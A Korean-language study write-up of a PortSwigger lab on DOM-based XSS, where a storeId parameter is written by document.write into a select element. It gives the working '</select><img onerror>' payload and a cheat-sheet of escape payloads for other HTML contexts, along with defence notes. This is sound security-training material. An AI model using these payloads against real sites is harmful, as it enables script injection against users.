# Lab: DOM XSS in document.write sink inside a select element

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Scripting (XSS) — DOM-based / `document.write` sink / `<select>` 컨텍스트 탈출
- **링크**: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element

## 목표

상품 페이지의 매장 선택 기능에서 `storeId` URL 파라미터가 `<select>` 태그 안에 `document.write` 로 삽입되는 취약점을 이용하여 `alert()` 를 실행시킨다.

## 취약점 분석

상품 페이지의 JavaScript:

```javascript
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');

document.write('<select name="storeId">');
if (store) {
    document.write('<option selected>' + store + '</option>');
}
for (var i = 0; i < stores.length; i++) {
    document.write('<option>' + stores[i] + '</option>');
}
document.write('</select>');
```

- **Source**: `location.search` → `URLSearchParams.get('storeId')`
- **Sink**: `document.write()`
- **삽입 컨텍스트**: `<select>` 태그 내부 `<option>` 값

## `<select>` 컨텍스트의 특수성

`<select>` 안에는 `<option>`, `<optgroup>` 만 유효한 자식 요소다.  
브라우저는 `<select>` 내부에서 `<img>`, `<svg>` 등 다른 태그를 **무시하거나 이동**시킨다.

```html
<!-- 이렇게 삽입해도 브라우저가 img를 select 밖으로 밀어냄 -->
<select>
  <option><img src=x onerror=alert(1)></option>
</select>
<!-- → onerror가 발화하지 않거나 동작이 불안정함 -->
```

따라서 `</select>` 로 먼저 select 태그를 닫고 나서 XSS 페이로드를 삽입해야 한다.

## 공격 방법

URL 파라미터:
```
?productId=1&storeId=</select><img src=x onerror=alert(1)>
```

`document.write` 로 생성되는 HTML:

```html
<select name="storeId">
  <option selected></select><img src=x onerror=alert(1)></option>
  <option>London</option>
  <option>Paris</option>
  <option>Milan</option>
</select>
```

파싱 흐름:
```
</select>  → select 태그 닫힘
<img src=x onerror=alert(1)>  → 일반 HTML로 렌더링
→ 이미지 로드 실패 → onerror 발화 → alert(1) 실행
</option>, <option>... → 남은 텍스트는 body에 텍스트로 처리됨
```

## `location.search` 와 `URLSearchParams` 이해

이 랩에서 사용된 source 코드:

```javascript
var store = (new URLSearchParams(window.location.search)).get('storeId');
```

### `location.search`

현재 URL에서 `?` 이후의 쿼리 문자열 전체를 반환한다.

```
URL: https://example.com/product?productId=1&storeId=London
location.search  →  "?productId=1&storeId=London"
```

### `URLSearchParams`

쿼리 문자열을 파싱하여 개별 파라미터에 접근하는 Web API다.

```javascript
var params = new URLSearchParams(location.search);

params.get('storeId')       // "London"
params.get('productId')     // "1"
params.has('storeId')       // true
params.getAll('tag')        // 같은 이름 파라미터 모두 배열로
params.keys()               // 파라미터 이름 이터레이터
params.values()             // 파라미터 값 이터레이터

// 예: 모든 파라미터 출력
for (const [key, value] of params) {
    console.log(key, value);
}
```

`URLSearchParams.get()` 의 반환값이 필터링 없이 `document.write` 나 `innerHTML` 에 전달되면 DOM XSS source가 된다.

## 이전 랩들과의 비교

| 항목 | 003 (document.write) | 010 (이번 랩) |
|------|----------------------|--------------|
| Source | `location.search` | `location.search` (URLSearchParams) |
| Sink | `document.write` | `document.write` |
| 삽입 컨텍스트 | `<img src="...">` 속성 | `<select><option>...</option>` |
| 탈출 방법 | `">` 로 속성+태그 닫기 | `</select>` 로 부모 태그 닫기 |
| 난이도 | Apprentice | **Practitioner** |

Practitioner부터는 **삽입 위치가 중첩 태그 안**에 있어 탈출이 한 단계 더 필요하다.

## 핵심 정리

- 삽입 컨텍스트를 정확히 파악하는 것이 공격의 시작이다 — `<select>` 안에서는 일반 XSS 태그가 동작하지 않는다.
- 부모 태그(`</select>`)를 닫은 뒤 페이로드를 삽입하면 HTML 파서가 정상 처리한다.
- `URLSearchParams.get()` 은 편리한 쿼리 파싱 API지만, 반환값을 그대로 DOM에 삽입하면 XSS source가 된다.
- **방어**: `URLSearchParams` 로 읽은 값을 DOM에 삽입하기 전 `encodeURIComponent()` 또는 `textContent` 로 처리.

## 배운 점 및 추가 학습

### 1. 브라우저의 HTML 파싱 규칙 활용

브라우저는 HTML 파싱 시 잘못된 구조를 **자동으로 보정**한다. 공격자는 이 보정 동작을 역이용한다.

| 상황 | 브라우저 동작 | 공격 활용 |
|------|--------------|-----------|
| `<select>` 안에 `<img>` | img를 select 밖으로 이동 | `</select>` 로 먼저 닫아야 함 |
| `<table>` 안에 `<script>` | script를 table 밖으로 이동 | `</table>` 로 먼저 닫기 |
| 닫히지 않은 태그 | 자동으로 닫음 | 문법 오류 없이 페이로드 삽입 가능 |
| 중첩 `<a>` 태그 | 외부 `<a>` 닫고 새로 시작 | href 이중 삽입 가능 |

### 2. 컨텍스트 파악 → 탈출 방법 결정 흐름

```
입력값이 어디에 반영되는가?

├── 태그 사이 (text node)
│     → <svg onload=...> 또는 <img onerror=...>
│
├── 속성값 안
│   ├── " 로 감싸진 경우 → " 로 탈출 → onfocus 등 이벤트
│   ├── ' 로 감싸진 경우 → ' 로 탈출
│   └── href/src 속성    → javascript: 프로토콜
│
├── <select><option> 안         ← 이번 랩
│     → </select> 로 부모 태그 닫고 → <img onerror=...>
│
├── <textarea> 안
│     → </textarea> 로 닫고 → <img onerror=...>
│
├── <title> 안
│     → </title> 로 닫고 → <script>alert(1)</script>
│
├── <!-- HTML 주석 --> 안
│     → --> 로 닫고 → <img onerror=...>
│
└── JavaScript 문자열 안
      → ' 또는 " 로 탈출 → ;alert(1)//
```

### 3. `document.write` sink의 위험성 재정리

`document.write` 는 파싱 단계에서 HTML을 직접 삽입하므로, 어떤 구조 안에 삽입되든 브라우저 파서가 전체 HTML을 재해석한다. 이 때문에:

- `</select>` 를 삽입하면 실제로 select 가 닫힘
- `</script>` 를 삽입하면 실제로 script 가 닫힘
- `innerHTML` 과 달리 `<script>` 태그도 실행 가능

`innerHTML` 은 이미 파싱된 DOM에 삽입하므로 `<script>` 가 실행되지 않지만, `document.write` 는 파싱 과정에 개입하므로 제약이 더 적다.

### 4. Practitioner 레벨 특징

Apprentice 랩은 인코딩 없음 / 단순 삽입이 대부분이었다. Practitioner부터는:

- 삽입 컨텍스트가 중첩되어 있음 (`<select>`, `<textarea>`, `<title>`, 주석 등)
- 일부 문자가 필터링되어 우회가 필요
- Source와 Sink 사이에 코드가 개입하여 분석이 필요
- 여러 단계의 탈출이 조합됨
